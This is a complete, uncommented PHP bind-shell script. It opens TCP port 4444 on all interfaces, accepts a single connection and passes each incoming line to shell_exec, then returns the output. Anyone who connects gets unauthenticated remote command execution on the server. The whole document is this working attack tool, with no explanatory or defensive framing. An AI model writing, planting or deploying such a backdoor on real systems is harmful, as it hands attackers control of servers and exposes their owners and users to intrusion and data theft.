<?php
$port = 4444; // the port to bind
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($sock, "0.0.0.0", $port);
socket_listen($sock);

$client = socket_accept($sock);

while (true) {
	$input = socket_read($client, 1024);
	if (!$input) break;
	$output = shell_exec($input);
	socket_write($client, $output);
}

socket_close($client);
socket_close($sock);
